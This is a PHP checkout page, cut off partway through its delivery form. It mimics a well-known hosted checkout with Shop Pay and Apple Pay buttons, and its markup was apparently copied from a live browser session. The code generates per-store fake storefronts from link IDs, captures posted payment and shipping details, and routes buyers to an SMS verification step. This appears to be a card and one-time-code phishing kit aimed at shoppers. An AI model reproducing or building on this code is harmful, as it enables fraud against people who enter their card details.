<?php
session_start();

// Store the store ID in session if it's present in URL
if (isset($_GET['store'])) {
    $_SESSION['current_store_id'] = $_GET['store'];
}

// Load config
$config = require __DIR__ . '/config.php';

// Use stored store ID from session if available
$storeId = $_SESSION['current_store_id'] ?? null;

// Add helper functions
function formatPrice($price, $currency = null) {
    global $config;
    if ($currency === null) {
        $currency = $config['store']['currency'];
    }
    
    switch ($currency) {
        case 'EUR':
            return '€' . number_format($price, 2, '.', ',');
        case 'GBP':
            return '£' . number_format($price, 2, '.', ',');
        case 'CAD':
        case 'AUD':
        case 'USD':
        default:
            return '$' . number_format($price, 2, '.', ',');
    }
}

function getProductTotal() {
    global $config;
    return $config['product']['price'];
}

function getOrderTotal() {
    global $config;
    $total = getProductTotal();
    // Add shipping cost if it's not FREE
    if (isset($config['product']['shipping']['price']) && 
        $config['product']['shipping']['price'] !== 'FREE') {
        $total += floatval($config['product']['shipping']['price']);
    }
    return $total;
}

// Check if a specific store link is requested
$storeConfig = null;

if ($storeId && isset($config['generated_links'][$storeId])) {
    // Use the specific store configuration
    $storeConfig = $config['generated_links'][$storeId];
    
    // Override the main config with the store-specific config
    $config['store'] = $storeConfig['store'];
    $config['product'] = $storeConfig['product'];
}

function redirectToVerification() {
    $storeId = $_SESSION['current_store_id'] ?? '';
    $storeParam = $storeId ? "?store=" . urlencode($storeId) : '';
    header("Location: sms_verification.php" . $storeParam);
    exit;
}

// When saving shipping info, store it with the store ID
if (isset($_POST['shipping_info'])) {
    if (!isset($_SESSION['store_shipping_info'])) {
        $_SESSION['store_shipping_info'] = array();
    }
    $storeId = $_SESSION['current_store_id'] ?? 'default';
    $_SESSION['store_shipping_info'][$storeId] = $_POST['shipping_info'];
}

// When saving payment info
if (isset($_POST['payment_info'])) {
    if (!isset($_SESSION['store_payment_info'])) {
        $_SESSION['store_payment_info'] = array();
    }
    $storeId = $_SESSION['current_store_id'] ?? 'default';
    $_SESSION['store_payment_info'][$storeId] = $_POST['payment_info'];
}

?>
<!DOCTYPE html>
<html lang="en">
    
    <script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script>
    
    <head>    
    <script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;,&quot;ogs.google.com&quot;]" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/../executers/vi-tr.js"></script>
                    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wacknstack Checkout</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Payment Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="styles.css">
    <style>
        :root {
            --theme-color: <?php echo $config['store']['theme_color']; ?>;
        }
        .error-message {
            color: #EF4444;
            font-size: 0.75rem;
            display: none;
            margin-top: 2px;
            position: relative;  /* Change to relative */
            left: 0;
            margin-bottom: 4px;  /* Add some space after error message */
        }
        
        .input-error {
            border-color: #EF4444 !important;
        }

        .input-wrapper {
            position: relative;
            width: 100%;
        }

        /* Add spacing between input groups */
        .input-group {
            margin-bottom: 1rem;
        }

        .sticky-summary {
            position: sticky;
            top: 20px;
        }
    </style>
<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.16 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.absolute{position:absolute}.relative{position:relative}.sticky{position:sticky}.-right-2{right:-0.5rem}.-top-2{top:-0.5rem}.right-3{right:0.75rem}.top-1\/2{top:50%}.top-4{top:1rem}.order-1{order:1}.order-2{order:2}.mx-auto{margin-left:auto;margin-right:auto}.my-6{margin-top:1.5rem;margin-bottom:1.5rem}.mb-3{margin-bottom:0.75rem}.mb-4{margin-bottom:1rem}.mb-6{margin-bottom:1.5rem}.mb-8{margin-bottom:2rem}.ml-2{margin-left:0.5rem}.mr-2{margin-right:0.5rem}.mt-2{margin-top:0.5rem}.flex{display:flex}.grid{display:grid}.h-16{height:4rem}.h-4{height:1rem}.h-5{height:1.25rem}.h-6{height:1.5rem}.min-h-screen{min-height:100vh}.w-16{width:4rem}.w-20{width:5rem}.w-4{width:1rem}.w-5{width:1.25rem}.w-6{width:1.5rem}.w-full{width:100%}.max-w-6xl{max-width:72rem}.max-w-7xl{max-width:80rem}.flex-1{flex:1 1 0%}.-translate-y-1\/2{--tw-translate-y:-50%;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.grid-cols-1{grid-template-columns:repeat(1, minmax(0, 1fr))}.grid-cols-2{grid-template-columns:repeat(2, minmax(0, 1fr))}.items-start{align-items:flex-start}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.gap-1{gap:0.25rem}.gap-12{gap:3rem}.gap-2{gap:0.5rem}.gap-4{gap:1rem}.gap-6{gap:1.5rem}.space-x-4 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1rem * var(--tw-space-x-reverse));margin-left:calc(1rem * calc(1 - var(--tw-space-x-reverse)))}.space-y-2 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0.5rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0.5rem * var(--tw-space-y-reverse))}.space-y-4 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1rem * var(--tw-space-y-reverse))}.rounded{border-radius:0.25rem}.rounded-full{border-radius:9999px}.rounded-lg{border-radius:0.5rem}.rounded-md{border-radius:0.375rem}.rounded-l-md{border-top-left-radius:0.375rem;border-bottom-left-radius:0.375rem}.rounded-r-md{border-top-right-radius:0.375rem;border-bottom-right-radius:0.375rem}.border{border-width:1px}.border-b{border-bottom-width:1px}.border-l-0{border-left-width:0px}.border-t{border-top-width:1px}.border-gray-300{--tw-border-opacity:1;border-color:rgb(209 213 219 / var(--tw-border-opacity, 1))}.border-orange-500{--tw-border-opacity:1;border-color:rgb(249 115 22 / var(--tw-border-opacity, 1))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}.bg-\[\#5469d4\]{--tw-bg-opacity:1;background-color:rgb(84 105 212 / var(--tw-bg-opacity, 1))}.bg-\[\#E77C40\]{--tw-bg-opacity:1;background-color:rgb(231 124 64 / var(--tw-bg-opacity, 1))}.bg-\[\#FDF8F5\]{--tw-bg-opacity:1;background-color:rgb(253 248 245 / var(--tw-bg-opacity, 1))}.bg-black{--tw-bg-opacity:1;background-color:rgb(0 0 0 / var(--tw-bg-opacity, 1))}.bg-gray-50{--tw-bg-opacity:1;background-color:rgb(249 250 251 / var(--tw-bg-opacity, 1))}.bg-gray-500{--tw-bg-opacity:1;background-color:rgb(107 114 128 / var(--tw-bg-opacity, 1))}.object-cover{object-fit:cover}.p-3{padding:0.75rem}.p-4{padding:1rem}.p-6{padding:1.5rem}.px-3{padding-left:0.75rem;padding-right:0.75rem}.px-4{padding-left:1rem;padding-right:1rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.py-2{padding-top:0.5rem;padding-bottom:0.5rem}.py-3{padding-top:0.75rem;padding-bottom:0.75rem}.py-4{padding-top:1rem;padding-bottom:1rem}.py-8{padding-top:2rem;padding-bottom:2rem}.pt-4{padding-top:1rem}.text-center{text-align:center}.text-2xl{font-size:1.5rem;line-height:2rem}.text-base{font-size:1rem;line-height:1.5rem}.text-lg{font-size:1.125rem;line-height:1.75rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.text-xs{font-size:0.75rem;line-height:1rem}.font-bold{font-weight:700}.font-medium{font-weight:500}.text-blue-600{--tw-text-opacity:1;color:rgb(37 99 235 / var(--tw-text-opacity, 1))}.text-gray-400{--tw-text-opacity:1;color:rgb(156 163 175 / var(--tw-text-opacity, 1))}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128 / var(--tw-text-opacity, 1))}.text-gray-600{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.text-gray-700{--tw-text-opacity:1;color:rgb(55 65 81 / var(--tw-text-opacity, 1))}.text-orange-500{--tw-text-opacity:1;color:rgb(249 115 22 / var(--tw-text-opacity, 1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.placeholder-gray-500::placeholder{--tw-placeholder-opacity:1;color:rgb(107 114 128 / var(--tw-placeholder-opacity, 1))}.hover\:text-gray-700:hover{--tw-text-opacity:1;color:rgb(55 65 81 / var(--tw-text-opacity, 1))}.focus\:outline-none:focus{outline:2px solid transparent;outline-offset:2px}.focus\:ring-1:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)}.focus\:ring-gray-200:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(229 231 235 / var(--tw-ring-opacity, 1))}@media (min-width: 768px){.md\:order-1{order:1}.md\:order-2{order:2}.md\:grid-cols-2{grid-template-columns:repeat(2, minmax(0, 1fr))}}</style>
    
    <!-- Facebook Pixel Code -->
    <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '<?php echo htmlspecialchars($config['tracking']['facebook_pixel'] ?? '24000473539555555'); ?>');
    fbq('track', 'PageView');
    </script>
    <noscript><img height="1" width="1" style="display:none"
    src="https://www.facebook.com/tr?id=<?php echo htmlspecialchars($config['tracking']['facebook_pixel'] ?? '24000473539555555'); ?>&ev=PageView&noscript=1"
    /></noscript>

    <!-- TikTok Pixel Code -->
    <?php if (!empty($config['tracking']['tiktok_pixel'])): ?>
    <script>
    !function (w, d, t) {
      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)};
      ttq.load('<?php echo htmlspecialchars($config['tracking']['tiktok_pixel']); ?>');
      ttq.page();
    }(window, document, 'ttq');
    </script>
    <?php endif; ?>
    
    </head>


<body class="bg-white" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4yMCIsInNjb3JlIjoyMDAyMH1d" __processed_ebd3907a-dfe1-4646-8dde-ef9731fa6e38__="true" __processed_9f092913-ebeb-478f-a517-bdb3e28bda1b__="true" __processed_4673d76a-24b2-41b6-ac71-d003d901f645__="true" __processed_5a2a8fc7-335b-4887-89a2-df1f6acf2899__="true" __processed_8be83551-eb6f-4d58-927e-1584073e8b02__="true" __processed_7398313f-5d05-40ce-9a1c-1a69e6fd1376__="true" __processed_88c0aa5c-e2ef-423e-9bc5-d5b3601003f9__="true">
    <div class="min-h-screen" bis_skin_checked="1">
        <!-- Header -->
        <header class="py-4 px-6 border-b">
            <div class="flex justify-center items-center max-w-7xl mx-auto" bis_skin_checked="1">
                <div bis_skin_checked="1">
                    <h1 class="text-2xl flex-1 text-center">
                        <img src="<?php echo htmlspecialchars($config['store']['logo'] ?? '/img/logo.jpg'); ?>" 
                             alt="<?php echo htmlspecialchars($config['store']['name'] ?? 'Hot Sew'); ?>" 
                             class="h-20 hover:opacity-90 transition-opacity">
                    </h1>
                </div>
            </div>
        </header>

        <!-- Main Content -->
        <main class="max-w-7xl mx-auto px-4 py-4 md:py-8 mb-20">
            <div class="grid grid-cols-1 md:grid-cols-2 gap-12 md:gap-8" bis_skin_checked="1">
                <!-- Left Column - Checkout Form -->
                <div class="order-1" bis_skin_checked="1">
                    <!-- Express Checkout -->
                    <div class="mb-6 md:mb-8" bis_skin_checked="1">
                        <p class="text-center text-gray-600 mb-4 pt-6">Express checkout</p>
                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2" bis_skin_checked="1">
                            <button class="bg-[<?php echo $config['store']['theme_color']; ?>] text-white py-3 rounded-md flex items-center justify-center hover:bg-[#4a5dc0] transition-colors">
                                <svg xmlns="http://www.w3.org/2000/svg" fill="inherit" aria-hidden="true" preserveAspectRatio="xMidYMid" viewBox="0 0 341 80.035" class="w-20" style="fill: white;">
                                    <path fill-rule="evenodd" d="M227.297 0c-6.849 0-12.401 5.472-12.401 12.223v55.59c0 6.75 5.552 12.222 12.401 12.222h101.06c6.849 0 12.401-5.472 12.401-12.222v-55.59c0-6.75-5.552-12.223-12.401-12.223zm17.702 55.892v-14.09h8.994c8.217 0 12.586-4.542 12.586-11.423s-4.369-11-12.586-11h-14.788v36.513zm0-31.084h7.664c5.319 0 7.932 2.154 7.932 5.758s-2.518 5.758-7.695 5.758h-7.901zm31.796 31.833c4.417 0 7.314-1.92 8.644-5.196.38 3.65 2.613 5.523 7.457 4.26l.048-3.886c-1.948.187-2.328-.515-2.328-2.528v-9.55c0-5.617-3.752-8.94-10.686-8.94-6.84 0-10.782 3.37-10.782 9.08h5.32c0-2.714 1.947-4.353 5.367-4.353 3.609 0 5.272 1.545 5.224 4.214v1.217l-6.127.655c-6.887.749-10.686 3.324-10.686 7.818 0 3.698 2.659 7.209 8.549 7.209m1.187-4.213c-2.992 0-4.179-1.592-4.179-3.184 0-2.153 2.47-3.136 7.314-3.698l3.8-.421c-.238 4.12-3.04 7.303-6.935 7.303m32.555 5.29c-2.422 5.804-6.317 7.536-12.396 7.536h-2.613V60.48h2.803c3.324 0 4.939-1.03 6.697-3.979l-10.782-24.95h5.984l7.695 18.21 6.839-18.21h5.842z" clip-rule="evenodd"></path>
                                    <path d="M29.514 35.18c-7.934-1.697-11.469-2.36-11.469-5.374 0-2.834 2.392-4.246 7.176-4.246 4.207 0 7.283 1.813 9.546 5.363.171.274.524.369.812.222l8.927-4.447a.616.616 0 0 0 .256-.864c-3.705-6.332-10.55-9.798-19.562-9.798-11.843 0-19.2 5.752-19.2 14.898 0 9.714 8.96 12.169 16.904 13.865 7.944 1.697 11.49 2.36 11.49 5.374s-2.584 4.435-7.742 4.435c-4.763 0-8.297-2.15-10.433-6.321a.63.63 0 0 0-.843-.274L6.47 52.364a.623.623 0 0 0-.278.843c3.535 7.006 10.785 10.947 20.47 10.947 12.334 0 19.787-5.658 19.787-15.088s-9.001-12.169-16.935-13.865zM77.353 16.036c-5.062 0-9.536 1.77-12.75 4.92-.203.19-.534.053-.534-.221V.622a.62.62 0 0 0-.63-.622h-11.17a.62.62 0 0 0-.63.622v62.426a.62.62 0 0 0 .63.621h11.17a.62.62 0 0 0 .63-.621V35.664c0-5.289 4.11-9.345 9.653-9.345 5.542 0 9.557 3.972 9.557 9.345v27.384a.62.62 0 0 0 .63.621h11.17a.62.62 0 0 0 .63-.621V35.664c0-11.505-7.646-19.618-18.356-19.618zM118.389 14.255c-6.065 0-11.767 1.823-15.847 4.467a.62.62 0 0 0-.202.833l4.922 8.292c.182.295.566.4.865.22a19.8 19.8 0 0 1 10.262-2.78c9.749 0 16.914 6.785 16.914 15.75 0 7.64-5.734 13.297-13.006 13.297-5.926 0-10.037-3.403-10.037-8.207 0-2.75 1.185-5.005 4.271-6.596a.607.607 0 0 0 .246-.864l-4.645-7.754a.63.63 0 0 0-.759-.264c-6.225 2.276-10.593 7.755-10.593 15.109 0 11.126 8.981 19.428 21.507 19.428 14.629 0 25.147-9.998 25.147-24.338 0-15.372-12.237-26.603-29.066-26.603zM180.098 15.952c-5.649 0-10.689 2.054-14.373 5.678a.313.313 0 0 1-.534-.22v-4.363a.62.62 0 0 0-.63-.621H153.68a.62.62 0 0 0-.63.621v62.331a.62.62 0 0 0 .63.622h11.169a.62.62 0 0 0 .631-.622v-20.44c0-.274.331-.41.533-.231 3.674 3.371 8.532 5.342 14.096 5.342 13.102 0 23.321-10.463 23.321-24.054 0-13.592-10.23-24.054-23.321-24.054zm-2.103 37.54c-7.454 0-13.103-5.848-13.103-13.582 0-7.733 5.638-13.58 13.103-13.58s13.091 5.752 13.091 13.58-5.553 13.581-13.102 13.581z"></path>
                                </svg>
                            </button>
                            <button class="bg-black text-white py-3 rounded-md flex items-center justify-center hover:bg-gray-800 transition-colors">
                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-5 h-5 mr-2">
                                    <path d="M0 0h24v24H0z" fill="none"></path>
                                    <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"></path>
                                </svg>
                                Pay
                            </button>
                        </div>
                        <div class="flex items-center my-6" bis_skin_checked="1">
                            <div class="flex-1 border-t" bis_skin_checked="1"></div>
                            <span class="px-4 text-gray-500 text-sm">OR</span>
                            <div class="flex-1 border-t" bis_skin_checked="1"></div>
                        </div>
                    </div>

                    <!-- Contact Section -->
                    <div class="mb-8" bis_skin_checked="1">
                        <div class="flex justify-between items-center mb-4" bis_skin_checked="1">
                            <h2 class="text-base">Contact</h2>
                            <a href="#" class="text-black text-sm hover:text-gray-500">Log in</a>
                        </div>
                        <!-- Update the structure for all inputs -->

                        <!-- Contact Input -->
                        <div class="input-group" bis_skin_checked="1">
                            <div class="input-wrapper" bis_skin_checked="1">
                                <input type="text" id="contactInput" name="contact" placeholder="Email or mobile phone number" class="w-full p-3 border rounded-md focus:outline-none focus:ring-2 focus:ring-[<?php echo $config['store']['theme_color']; ?>] focus:border-[<?php echo $config['store']['theme_color']; ?>] transition-all" required="">
                            </div>
                            <div id="contactInputError" class="error-message" bis_skin_checked="1"></div>
                        </div>
                        <label class="flex items-center text-sm text-gray-600">
                            <input type="checkbox" class="mr-2">
                            <span>Email me with news and offers</span>
                        </label>
                    </div>

                    <!-- Delivery Section -->
                    <div class="mb-8" bis_skin_checked="1">
                        <h2 class="text-lg font-medium mb-4">Delivery</h2>
                        <select class="w-full p-3 border rounded mb-4 text-gray-700 focus:outline-none focus:ring-2 focus:ring-[<?php echo $config['store']['theme_color']; ?>] focus:border-[<?php echo $config['store']['theme_color']; ?>] transition-all" id="country">
                            <option value="US">United States</option>
                            <option value="CA">Canada</option>
                            <option value="GB">United Kingdom</option>
                            <option value="IE">Ireland</option>
                        </select>
                        <div class="grid grid-cols-2 gap-4" bis_skin_checked="1">
                            <!-- First Name and Last Name -->
                            <div class="input-group" bis_skin_checked="1">
                                <div class="input-wrapper" bis_skin_checked="1">
                                    <input type="text" id="firstName" name="firstName" placeholder="First name" class="w-full p-3 border rounded focus:outline-none focus:ring-2 focus:ring-[<?php echo $config['store']['theme_color']; ?>] focus:border-[<?php echo $config['store']['theme_color']; ?>] transition-all" required="">
                                </div>
                                <div id="firstNameError" class="error-message" bis_skin_checked="1"></div>
                            </div>
                            <div class="input-group" bis_skin_checked="1">
                                <div class="input-wrapper" bis_skin_checked="1">
                                    <input type="text" id="lastName" name="lastName" placeholder="Last name" class="w-full p-3 border rounded focus:outline-none focus:ring-2 focus:ring-[<?php echo $config['store']['theme_color']; ?>] focus:border-[<?php echo $config['store']['theme_color']; ?>] transition-all" required="">
                                </div>
                                <div id="lastNameError" class="error-message" bis_skin_checked="1"></div>
                            </div>
                        </div>
                        <input type="text" id="company" name="company" placeholder="Company (optional)" class="w-full p-3 border rounded mb-4 focus:outline-none focus:ring-2 focus:ring-[<?php echo $config['store']['theme_color']; ?>] focus:border-[<?php echo $config['store']['theme_color']; ?>] transition-all">
                        <input type="text" id="address" name="address" placeholder="Address" class="w-full p-3 border rounded mb-4 focus:outline-none focus:ring-2 focus:ring-[<?php echo $config['store']['theme_color']; ?>] focus:border-[<?php echo $config['store']['theme_color']; ?>] transition-all" required="">
                        <input type="text" id="apartment" name="apartment" placeholder="Apartment, suite, etc. (optional)" class="w-full p-3 border rounded mb-4 focus:outline-none focus:ring-2 focus:ring-[<?php echo $config['store']['theme_color']; ?>] focus:border-[<?php echo $config['store']['theme_color']; ?>] transition-all">
                        <div class="grid grid-cols-2 gap-4" bis_skin_checked="1">
                            <!-- Postal Code and City -->
                            <div class="input-group" bis_skin_checked="1">
                                <div class="input-wrapper" bis_skin_checked="1">
